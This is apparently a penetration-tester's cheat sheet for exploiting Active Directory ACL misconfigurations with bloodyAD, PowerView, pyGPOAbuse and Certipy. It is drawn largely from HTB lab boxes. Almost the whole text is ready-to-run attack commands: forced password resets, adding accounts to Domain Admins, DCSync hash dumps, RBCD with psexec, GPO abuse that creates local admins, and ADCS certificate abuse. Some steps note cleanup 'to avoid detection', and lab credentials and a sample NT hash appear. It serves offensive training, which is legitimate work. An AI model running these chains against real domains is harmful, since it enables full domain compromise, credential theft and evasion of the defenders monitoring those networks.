# 04 — ACL Abuse (bloodyAD + PowerView)

BloodHound surfaces the *attack edges* — `GenericAll`, `WriteOwner`, `WriteDACL`, `ForceChangePassword`, `AddSelf`, `WriteSPN`. This file is how you exploit them.

**Lane:** creds + reach from Kali → **bloodyAD** (below). Domain-joined Windows foothold, no creds → **PowerView** ([workflow](#powerview-acl-workflow-from-a-domain-joined-windows-host)). Reading edges = BloodHound or PowerView; impacket can't read ACLs.

**Jump to:** [Install](#install) · [Read object](#read-an-object) · [Set attribute](#set-an-attribute) · [Add to group](#add-group-membership-when-you-have-rights-on-a-group) · [Writable objects](#show-writeable-objects-which-acl-edges-grant-you-something) · [Abuses by edge](#common-abuses-by-edge) · [GPO abuse](#gpo-abuse-via-a-writable-gpo) · [ADCS / Certipy](#adcs-abuse-certipy) · [Edge→tool map](#mapping-bloodhound-edges-to-tooling) · [PowerView workflow](#powerview-acl-workflow-from-a-domain-joined-windows-host)

---

### Install

```bash
pipx install bloodyAD
## or
git clone https://github.com/CravateRouge/bloodyAD && cd bloodyAD
pip install -r requirements.txt --break-system-packages
```

### Read an Object

```bash
bloodyAD -u <user> -p '<pass>' -d <dom>.local --host <dc-ip> get object <target>
```

### Set an Attribute

```bash
bloodyAD -u <user> -p '<pass>' -d <dom>.local --host <dc-ip> \
    set object -v '<value>' <target> <attr>
```

Examples worth knowing:

```bash
## Add a UPN suffix
bloodyAD ... set object -v 'admin@<dom>.local' jdoe userPrincipalName

## Set a fake SPN so the account becomes Kerberoastable
bloodyAD ... set object -v 'fake/spn' victim servicePrincipalName

## Disable account lockout / pwdLastSet manipulation
bloodyAD ... set object -v '0' victim pwdLastSet
```

### Add Group Membership (when you have rights on a group)

```bash
bloodyAD -u <user> -p '<pass>' -d <dom>.local --host <dc-ip> \
    add groupMember 'Domain Admins' <user-to-add>
```

### Show Writeable Objects (which ACL edges grant you something)

```bash
bloodyAD -u <user> -p '<pass>' -d <dom>.local --host <dc-ip> get writable
```

### Common Abuses by Edge

| BloodHound edge | What `bloodyAD` lets you do |
|-----------------|------------------------------|
| **GenericAll** | Anything — reset password, change SPN, add to group, write `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD). |
| **GenericWrite** | Change attributes — set SPN to make user Kerberoastable, set logon script. |
| **WriteOwner** | `set owner <yourself> <target>` → then grant yourself the rights you actually want. |
| **WriteDACL** | Modify the ACL directly → grant `GenericAll`. |
| **ForceChangePassword** | Reset the target's password without knowing the current one. |
| **AddMember** | Add yourself to a group (`Domain Admins`, `Account Operators`, etc.). |
| **AddSelf** | Add yourself to a specific group (same effect as AddMember on yourself). |

#### Examples

##### ForceChangePassword

```bash
bloodyAD -u <user> -p '<pass>' -d <dom>.local --host <dc-ip> \
    set password '<victim>' 'NewP@ss123!'
```

##### WriteOwner Chain (own → grant → exploit)

`WriteOwner` alone doesn't let you do anything. The pattern is: seize ownership → grant yourself `GenericAll` → then use whatever privileged path the target object opens up (RBCD, Kerberoast, cert request, DCSync).

```bash
## 1. Take ownership of the target
bloodyAD -u <user> -p '<pass>' -d <dom>.local --host <dc-ip> set owner <target> <user>

## 2. Grant yourself GenericAll on the now-owned object
bloodyAD -u <user> -p '<pass>' -d <dom>.local --host <dc-ip> add genericAll <target> <user>

## 3. Whatever the target lets you do
##    - If <target> is a user with ADCS enrollment rights → certipy shadow to steal its NT hash:
certipy-ad shadow auto -u <user>@<dom>.local -p '<pass>' -account <target> -dc-ip <dc-ip>
##    - If <target> is a computer object → RBCD (see below)
##    - If <target> is a group → add yourself to it
```

##### WriteDACL → Self DCSync (one-shot)

If you have `WriteDACL` on the *domain object* itself, you can grant yourself the two extended rights that make up DCSync (`DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`) with one bloodyAD call, then dump the domain.

```bash
bloodyAD --host <dc-ip> -d <dom>.local -u <user> -p '<pass>' \
    add dcsync <user>

impacket-secretsdump -just-dc <dom>/<user>:'<pass>'@<dc-ip>
```

##### GenericAll on a Group — Add Yourself, Inherit Everything

`GenericAll` on a group means you can `add groupMember` — which means every ACL edge the group holds becomes an edge *you* hold. This is how you chain nested group rights: pop a low-priv user with `GenericAll` on some helpdesk group, add yourself, and now you have whatever the helpdesk group had over the next tier.

```bash
bloodyAD --host <dc-ip> -d <dom>.local -u <user> -p '<pass>' \
    add groupMember '<target-group>' <user>

## Then re-run BloodHound / `get writable` from your account to see the new edges
bloodyAD --host <dc-ip> -d <dom>.local -u <user> -p '<pass>' get writable
```

##### Setting a Fake SPN (Targeted Kerberoasting)

```bash
bloodyAD ... set object -v 'http/x' <victim> servicePrincipalName
impacket-GetUserSPNs <dom>/<user>:<pass> -dc-ip <dc-ip> -request -outputfile spn.txt
hashcat -m 13100 spn.txt rockyou.txt
```

##### Writing msDs-AllowedToActOnBehalfOfOtherIdentity (RBCD)

```bash
impacket-addcomputer -computer-name 'PWN$' -computer-pass 'P@ss123' \
    -dc-ip <dc-ip> <dom>/<user>:<pass>

bloodyAD -u <user> -p '<pass>' -d <dom>.local --host <dc-ip> \
    add rbcd <victim-host> 'PWN$'

impacket-getST -spn cifs/<victim-fqdn> -impersonate Administrator <dom>/'PWN$':'P@ss123'
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass <dom>/Administrator@<victim-fqdn>
```

### GPO Abuse via a Writable GPO

`WriteOwner`, `WriteDACL`, or `GenericWrite` over a **GPO object** (not just a user/group) is a fast path to SYSTEM on every machine the GPO applies to. If that GPO is GPLinked to the **Domain Controllers** OU (or the domain root), it's domain compromise. BloodHound shows it as a `GenericWrite` / `WriteDacl` / `WriteOwner` / `Owns` edge from your principal to a **GPO** node — check the GPO's linked OUs in Object Information (DC OU = full compromise).

Technique: T1484.001 (Group Policy Modification). The abuse writes an **immediate scheduled task** into the GPO's SYSVOL files that runs as `NT AUTHORITY\SYSTEM` on the next GP refresh (<=90 min + up to 30 random, or forced with `gpupdate /force`).

> **Enumerate with the matching ingestor:** a BloodHound CE GUI needs `bloodhound-ce-python`, legacy needs `bloodhound-python`. A collector/GUI mismatch throws `cannot unmarshal number into ... TrustDirection`.

#### Automated — pyGPOAbuse (prefer this)

```bash
git clone https://github.com/Hackndo/pyGPOAbuse /opt/pyGPOAbuse && cd /opt/pyGPOAbuse
pip install -r requirements.txt --break-system-packages
sed -i 's/\r$//' pygpoabuse.py        # fix CRLF shebang if the tool won't run

## Default action = add a local admin on every machine in scope
python3 pygpoabuse.py <domain>/<user>:'<pass>' -gpo-id "<GPO-GUID>"

## Targeted + quieter: run a specific command, filter scope, clean up after
python3 pygpoabuse.py <domain>/<user>:'<pass>' -gpo-id "<GPO-GUID>" \
    -command 'net user pwned P@ssw0rd123! /add && net localgroup administrators pwned /add' \
    -filter-enabled --cleanup
```

Get the GPO GUID from the BloodHound GPO node (Object Information) or over LDAP (`CN=Policies,CN=System,...`). Then wait for GP refresh (or force `gpupdate /force` on the target) and authenticate as the new admin.

#### Manual — WriteOwner-only fallback

With only `WriteOwner` on the GPO's GPC object, seize ownership and grant yourself a write DACL first, then let pyGPOAbuse do the SYSVOL work:

```bash
impacket-owneredit -action write -new-owner '<user>' \
  -target-dn 'CN={<GPO-GUID>},CN=POLICIES,CN=SYSTEM,DC=<dom>,DC=<tld>' \
  -dc-ip <dc-ip> '<domain>/<user>:<pass>'

impacket-dacledit -action write -rights FullControl -principal '<user>' \
  -target-dn 'CN={<GPO-GUID>},CN=POLICIES,CN=SYSTEM,DC=<dom>,DC=<tld>' \
  -dc-ip <dc-ip> '<domain>/<user>:<pass>'

## now you hold write over the GPO -> run pyGPOAbuse as above
```

Fully manual (no tooling): drop an immediate-task `ScheduledTasks.xml` into `\\<dc>\SYSVOL\<domain>\Policies\{<GPO-GUID>}\Machine\Preferences\ScheduledTasks\`, add the GPP client-side-extension GUIDs to `gPCMachineExtensionNames`, and bump `versionNumber` in `GPT.INI`. pyGPOAbuse automates all of this — prefer it.

### ADCS Abuse (Certipy)

If Active Directory Certificate Services is deployed, there's almost always an insta-DA path — enrolling a certificate as a privileged user, then authenticating with the cert to pull that user's NT hash.

**Naming tell:** any account called `ca_svc`, `cert_svc`, `pki_svc`, `enrollment_svc` — that's the CA's operator account and usually holds enroll rights on every template.

#### Find vulnerable templates

```bash
certipy-ad find -u <user>@<dom>.local -p '<pass>' -dc-ip <dc-ip> -vulnerable -stdout

## Or with an NT hash
certipy-ad find -u <user>@<dom>.local -hashes <NTLM> -dc-ip <dc-ip> -vulnerable -stdout
```

#### ESC categories (short)

| ESC | What's wrong | Fix path |
|-----|--------------|----------|
| **ESC1** | Template lets requester supply SAN + is set for client auth | Request a cert `-upn Administrator@<dom>` and auth as them |
| **ESC2** | Template usable as any-purpose (or Enrollment Agent) | Request a cert that authenticates as any user |
| **ESC3** | Enrollment Agent template + a client-auth template exists | Enrollment Agent → on-behalf-of DA |
| **ESC4** | You hold write rights over a template | Rewrite it to be ESC1-vulnerable, exploit, restore |
| **ESC6** | CA has `EDITF_ATTRIBUTESUBJECTALTNAME2` flag set | Any template → supply SAN → ESC1 |
| **ESC7** | You have `ManageCA` / `ManageCertificates` on the CA itself | Approve your own pending cert / enable the ESC6 flag |
| **ESC8** | HTTP endpoint of CA + NTLM enabled | NTLM relay coerced auth → get cert |
| **ESC9/10** | Template/UPN lets you drop the SID binding (no `szOID_NTDS_CA_SECURITY_EXT`) | Swap a controlled account's UPN to the target, request cert, auth |
| **ESC13** | Enroll right + template linked to a privileged group via an issuance policy / OID group link | Enroll → cert carries the group membership |
| **ESC16** | **CA-wide**: the CA omits the SID security extension on *all* issued certs | Swap any controlled enrollee's UPN to the target, request on a basic client-auth template (e.g. `User`), auth, restore UPN |

#### ESC1 (request cert as Administrator directly)

```bash
certipy-ad req -u <user>@<dom>.local -p '<pass>' \
    -ca '<CA-name>' -template '<vuln-template>' \
    -upn Administrator@<dom>.local -dc-ip <dc-ip>

## Auth with the cert → hash
certipy-ad auth -pfx administrator.pfx -dc-ip <dc-ip>
```

#### Reading certipy output + the gotchas that cost time

**Spot ESC1 from the raw template fields** — don't wait for the `[!] Vulnerabilities` line, these four *are* the tell:
- `Enrollee Supplies Subject : True`  (you choose the SAN / UPN)
- `Client Authentication : True`      (the cert can auth to AD)
- `Enrollment Rights` includes a group you're in (e.g. `Domain Users`)
- `Requires Manager Approval : False` + `Authorized Signatures Required : 0`

Save and grep instead of scrolling (template name + CA sit *above* the finding):

```bash
certipy-ad find -u <user>@<dom> -p '<pass>' -dc-ip <dc-ip> -vulnerable -stdout | tee certipy.txt
grep -iB10 Vulnerabilities certipy.txt
```

**Two failure modes, both near-guaranteed on these boxes:**

- **DNS** — `req` dies with *"query name does not exist"* / *"Failed to get DCE RPC connection."* Either add `/etc/hosts` (`<dc-ip> dc.<dom> <dom>`) **or** let certipy resolve through the DC with `-dc-ip <dc-ip> -ns <dc-ip>`.
- **Clock skew** — `auth` dies with `KRB_AP_ERR_SKEW (Clock skew too great)`. Sync right before it: `sudo ntpdate <dc-ip>` (HTB skews are often *hours*). If it drifts back between steps, `sudo systemctl stop systemd-timesyncd` for the session.

**Post-KB5014754 (`-sid`)** — if `req` warns *"Certificate has no object SID"* and `auth` then fails with `KDC_ERR_CERTIFICATE_MISMATCH`, the DC enforces strong cert binding. Re-request with the target's SID: `certipy-ad req ... -upn Administrator@<dom> -sid <admin-SID>`.

#### ESC4 (rewrite → exploit → restore)

```bash
## Rewrite the target template into an ESC1-vulnerable state
certipy-ad template -u <user>@<dom>.local -hashes <NTLM> \
    -template '<template>' -dc-ip <dc-ip> -write-default-configuration

## Now exploit as ESC1
certipy-ad req -u <user>@<dom>.local -hashes <NTLM> \
    -ca '<CA-name>' -template '<template>' \
    -upn Administrator@<dom>.local -dc-ip <dc-ip>

certipy-ad auth -pfx administrator.pfx -dc-ip <dc-ip>

## When done, restore the template's original config to avoid detection
certipy-ad template -u <user>@<dom>.local -hashes <NTLM> \
    -template '<template>' -dc-ip <dc-ip> -write-configuration <saved-config>
```

#### Chain: WriteOwner on ca_svc → ADCS DA

The full path when you land in the middle of a domain (as in EscapeTwo):

```
low-priv user
  → WriteOwner on ca_svc
  → set owner + genericAll on ca_svc         (bloodyAD)
  → certipy-ad shadow auto → ca_svc NT hash  (steals a shadow credential)
  → certipy-ad find -vulnerable              (as ca_svc — sees every template)
  → certipy-ad template ... -write-default-configuration  (ESC4 rewrite)
  → certipy-ad req -upn Administrator        (ESC1 exploit)
  → certipy-ad auth -pfx administrator.pfx   → Administrator NT hash
  → impacket-psexec -hashes :<NTLM> administrator@dc
```

#### Chain: group write → Shadow Creds → ESC16 (Fluffy)

When your ACL edge is over a **group** (not the CA account directly) and the CA
is globally ESC16-vulnerable. One-liner:
`write on group` → self into group → Shadow Creds on `ca_svc` → ESC16 UPN-swap cert as administrator → DA.

```bash
DC=<dc-ip>          # e.g. DC01.fluffy.htb / its IP
DOM=fluffy.htb
U=p.agila; P='prometheusx-303'

## 1. Group write -> object control. The ACL is on the group, so add YOURSELF
##    to it to inherit the group's control over its members. Re-auth after
##    (new group SID must be in your ticket / fresh TGT).
bloodyAD --host $DC -d $DOM -u $U -p "$P" add groupMember "Service Accounts" $U

## 2. Shadow Credentials -> ca_svc NT hash. Group membership grants write over
##    ca_svc's msDS-KeyCredentialLink. PKINIT recovers the hash, no cracking.
certipy-ad shadow auto -u $U@$DOM -p "$P" -dc-ip $DC -account ca_svc
##    -> ca_svc NT hash (e.g. ca0f4f9e9eb8a092addf53bb03fc98c8)

## 3. ESC16 -> cert as administrator. Swap ca_svc's UPN to the target, request
##    on a basic client-auth template (User), auth, then RESTORE the UPN.
certipy-ad account -u ca_svc@$DOM -hashes :<ca_svc-hash> -dc-ip $DC \
    -user ca_svc -upn administrator@$DOM update
certipy-ad req -u ca_svc@$DOM -hashes :<ca_svc-hash> \
    -dc-ip $DC -target DC01.$DOM -ca fluffy-DC01-CA -template User \
    -upn administrator@$DOM
certipy-ad auth -pfx administrator.pfx -dc-ip $DC
##    -> administrator NT hash
evil-winrm -i $DC -u administrator -H <admin-hash>

## 4. Cleanup: restore ca_svc's UPN, and clear any fake SPN you set.
certipy-ad account -u ca_svc@$DOM -hashes :<ca_svc-hash> -dc-ip $DC \
    -user ca_svc -upn ca_svc@$DOM update
```

**Gotchas that cost time on this chain:**
- **ACL on a group != ACL on its members.** First shadow attempt failed
  `INSUFF_ACCESS_RIGHTS (0x2098)` because control was over the *group*. Always
  check whether a write primitive is on the object or on a group that contains
  it — add yourself to the group first, then re-auth.
- **Prefer Shadow Creds over Kerberoasting when you can write.** Targeted-roast
  was wasted effort here (the TGS hash wasn't in rockyou). Shadow creds gives the
  NT hash directly, no cracking, whenever you can write `msDS-KeyCredentialLink`
  and the DC has a KDC cert (AD CS present = it does).
- **UPN must be fully qualified.** Bare `administrator` produced a cert with SAN
  `administrator` -> Kerberos auth failed "name mismatch." Use
  `-upn administrator@$DOM` on **both** `account update` and `req`. For ESC16
  certs (no SID), `certipy-ad auth ... -ldap-shell` is a fallback when PKINIT
  name-matching is fussy.
- **A client-side RPC timeout does not mean the request failed.** "NETBIOS timed
  out" after connecting to `\pipe\cert` was a red herring — the request reached
  the CA (request ID was assigned). The hang tracked the UPN not being set
  correctly; once the UPN was right the same `req` succeeded.
- **Confirm the ESC from enum, not a walkthrough.** Always run
  `certipy-ad find -vulnerable` first — `-template` choice and UPN placement
  differ between ESC9 / ESC13 / ESC16.

### Mapping BloodHound Edges to Tooling

| Edge | Abuse path |
|------|------------|
| `ForceChangePassword` | `Set-DomainUserPassword` (PowerView) or bloodyAD `set password` |
| `Add Members` | `Add-DomainGroupMember` (PowerView) or bloodyAD `add groupMember` |
| `GenericAll` | Set password / add to group / set SPN for Kerberoasting / set RBCD attribute |
| `GenericWrite` | Set fake SPN → Kerberoast |
| `WriteOwner` | `Set-DomainObjectOwner` |
| `WriteDACL` | `Add-DomainObjectACL` |
| `AllExtendedRights` | `Set-DomainUserPassword` or `Add-DomainGroupMember` |
| `AddSelf` | `Add-DomainGroupMember` |

### PowerView ACL Workflow (from a domain-joined Windows host)

#### Auth as your Tier-0 user (if you don't already have a session as them)

```bash
$SecPassword = ConvertTo-SecureString '<password>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
```

#### Find what you can write

```bash
## Resolve a name to a SID
$sid = Convert-NameToSid wley

## ACLs where this principal has any modify rights
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
```

Slower but sometimes clearer — diff every user's ACL against your principal:

```bash
Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt

foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {
    get-acl "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access |
        Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}
}
```

Chain forward — after compromising one ACL edge, check the *next* identity's edges:

```bash
$sid2 = Convert-NameToSid damundsen
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2} -Verbose
```

> BloodHound is faster for chaining — click your starting principal, **Outbound Control Rights**, follow the path.

### ACL Abuse — PowerView Examples

#### Force-change a downstream user's password

```bash
$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
Import-Module .\PowerView.ps1
Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword `
    -Credential $Cred -Verbose
```

#### Add a user to a group you control

```bash
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose

## Confirm
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName
```

#### Set a fake SPN → make a user Kerberoastable

```bash
Set-DomainObject -Credential $Cred2 -Identity adunn `
    -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose

## Then crack the new ticket
.\Rubeus.exe kerberoast /user:adunn /nowrap
```

#### GenericWrite → Add yourself to Domain Admins (cmd-prompt method)

```bash
net group 'Domain Admins' ct059 /add /domain
```

Then drop into a session as your new admin:

```bash
$cred = New-Object System.Management.Automation.PSCredential(
    "INLANEFREIGHT\CT059",
    (ConvertTo-SecureString "charlie1" -AsPlainText -Force))
Enter-PSSession -ComputerName DC01 -Credential $cred
```

#### DCSync once you have the right ACE

```bash
impacket-secretsdump -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5
```

### Reference

- Harmj0y's classic AD ACL cheatsheet: <https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993>
- bloodyAD docs: <https://github.com/CravateRouge/bloodyAD/wiki>
